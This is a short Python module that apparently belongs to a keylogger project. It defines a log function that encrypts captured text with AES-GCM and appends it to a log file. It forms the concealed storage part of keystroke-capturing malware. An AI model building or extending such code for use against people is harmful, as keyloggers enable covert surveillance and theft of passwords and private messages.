from .encryption import encrypt_aes_gcm

import Keylogger.constants as constants


def log(text):
    """
    Receive input text, encrypt and log it. Magic!
    """
    msg_to_log = encrypt_aes_gcm(text, constants.ENCRYPTION_KEY)
    with open(constants.LOGGING_PATH, 'a') as f:
        f.write(f'{msg_to_log}\n')